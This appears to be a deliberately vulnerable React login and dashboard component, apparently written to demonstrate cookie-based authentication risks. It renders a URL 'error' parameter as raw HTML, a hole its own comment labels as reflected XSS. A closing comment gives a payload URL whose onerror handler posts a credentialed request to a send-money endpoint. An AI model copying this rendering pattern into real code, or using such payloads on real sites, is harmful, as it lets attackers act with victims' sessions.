/** USING COOKIES */
import { useState, useEffect } from "react";

// Change: don't use localStorage
const API = "http://localhost:4000";

function App() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");

  useEffect(() => {
    const query = new URLSearchParams(window.location.search);
    const emailParam = query.get("email");
    const errorParam = query.get("error");
    if (emailParam) setEmail(emailParam);
    if (errorParam) setError(errorParam);
  }, []);

  const handleRegister = async () => {
    const res = await fetch(`${API}/register`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, password }),
    });
    const data = await res.json();
    alert(data.message || data.error);
  };

  const handleLogin = async () => {
    const res = await fetch(`${API}/login`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      credentials: "include", // tell browser to store the cookie
      body: JSON.stringify({ email, password }),
    });
    const data = await res.json();
    console.log("Login response:", data);

    if (data.success) {
      window.location.href = "/dashboard";
    } else {
      const safeEmail = encodeURIComponent(email);
      const safeError = encodeURIComponent(data.error);
      window.location.href = `/?email=${safeEmail}&error=${safeError}`;
    }
  };

  const handleLogout = async () => {
    await fetch(`${API}/logout`, {
      method: "POST",
      credentials: "include", // include the cookie so backend can clear it
    });
    window.location.href = "/";
  };

  // 🔐 Dashboard page (requires token in cookie)
  if (window.location.pathname === "/dashboard") {
    return (
      <div style={{ padding: "20px" }}>
        <h2>Welcome!</h2>
        <p>You are logged in via cookie.</p>
        <button onClick={handleLogout}>Logout</button>
      </div>
    );
  }

  return (
    <div style={{ padding: "20px", maxWidth: "400px", margin: "auto" }}>
      <h2>Login / Register</h2>

      <input
        placeholder="Email"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
        style={{ width: "100%", marginBottom: "10px" }}
      />
      <input
        placeholder="Password"
        type="password"
        value={password}
        onChange={(e) => setPassword(e.target.value)}
        style={{ width: "100%", marginBottom: "10px" }}
      />

      <div>
        <button onClick={handleLogin}>Login</button>
        <button onClick={handleRegister} style={{ marginLeft: "10px" }}>
          Register
        </button>
      </div>

      {/* Reflected XSS vulnerability */}
      {error && (
        <div
          style={{
            marginTop: "30px",
            padding: "10px",
            border: "1px solid red",
            backgroundColor: "#ffeeee",
          }}
          dangerouslySetInnerHTML={{ __html: error }}
        />
      )}
    </div>
  );
}

export default App;

// http://localhost:5173/?error=<img src=x onerror="fetch('http://localhost:4000/send-money',{method:'POST',credentials:'include'})">
